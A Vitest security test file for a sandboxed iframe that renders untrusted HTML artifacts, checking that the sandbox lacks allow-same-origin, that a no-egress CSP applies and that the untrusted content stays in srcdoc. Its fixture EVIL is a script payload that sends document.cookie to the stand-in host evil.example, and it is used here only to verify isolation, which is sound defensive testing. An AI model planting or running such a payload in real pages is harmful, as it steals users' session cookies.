/**
 * ADR 0128 Phase 2 — SECURITY tests for the sandboxed interactive-artifact frame.
 * These assert the isolation invariants that keep untrusted HTML from touching the
 * parent: no allow-same-origin, a no-egress CSP, body only in srcdoc, toggle-gated.
 */
import { describe, it, expect, vi, afterEach } from 'vitest';
import { render, cleanup } from '@testing-library/react';

let enabled = true;
vi.mock('../../../featureToggles/FeatureAccessContext.js', () => ({
  useFeatureAccess: () => ({ enabled, status: enabled ? 'on' : 'off', isBeta: false, variant: null }),
}));
import { SandboxedArtifactFrame, buildArtifactSrcdoc, ARTIFACT_SANDBOX, ARTIFACT_CSP } from '../SandboxedArtifactFrame.js';

afterEach(() => { enabled = true; cleanup(); });

const EVIL = '<script>fetch("https://evil.example/?c="+document.cookie)</script><h1>art</h1>';

describe('SandboxedArtifactFrame — isolation invariants', () => {
  it('sandboxes WITHOUT allow-same-origin (opaque origin, no parent/cookie access)', () => {
    const { container } = render(<SandboxedArtifactFrame body={EVIL} />);
    const iframe = container.querySelector('iframe')!;
    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts');
    expect(iframe.getAttribute('sandbox')).not.toContain('allow-same-origin');
    expect(iframe.getAttribute('sandbox')).not.toContain('allow-top-navigation');
    expect(iframe.getAttribute('sandbox')).not.toContain('allow-popups');
  });

  it('injects a no-egress CSP (default-src none → no exfiltration)', () => {
    expect(ARTIFACT_CSP).toContain("default-src 'none'");
    expect(ARTIFACT_CSP).not.toContain('connect-src'); // no network
    const doc = buildArtifactSrcdoc(EVIL);
    expect(doc).toContain(`content="${ARTIFACT_CSP}"`);
    expect(doc).toContain('http-equiv="Content-Security-Policy"');
  });

  it('puts the untrusted body ONLY in srcdoc — never the parent DOM', () => {
    const { container } = render(<SandboxedArtifactFrame body={EVIL} />);
    // The parent must not contain the raw <script>/<h1> as real DOM nodes.
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('h1')).toBeNull();
    // It lives in the iframe srcdoc (a string attribute), origin-isolated.
    const iframe = container.querySelector('iframe')!;
    expect(iframe.getAttribute('srcdoc')).toContain('<h1>art</h1>');
  });

  it('IART-6: truncates a body over the render cap (still renders; srcdoc is bounded)', () => {
    const huge = 'a'.repeat(600_000); // > the 512KB cap
    const { container } = render(<SandboxedArtifactFrame body={huge} />);
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!;
    expect(srcdoc.length).toBeLessThan(huge.length); // capped, not unbounded
    expect(srcdoc).toContain('aaaa');                // the (truncated) content still renders
  });

  it('ARTIFACT_SANDBOX is allow-scripts only', () => {
    expect(ARTIFACT_SANDBOX).toBe('allow-scripts');
  });
});
